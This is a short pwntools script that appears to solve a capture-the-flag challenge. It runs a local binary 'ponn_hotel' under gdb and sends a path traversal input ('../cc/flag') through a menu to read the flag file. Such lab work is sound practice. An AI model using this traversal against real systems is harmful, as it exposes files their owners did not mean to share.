from pwn import *

context.terminal = ["tmux", "new-window"]

e = ELF("./ponn_hotel")
p = process(e.path)


gdb.attach(p, """
c
""")

p.recvuntil(b">")
p.sendline(b"2")
p.recvuntil(b">")
p.sendline(b"../cc/flag")
p.recvuntil(b">")
p.send(b"\x00")

p.interactive()
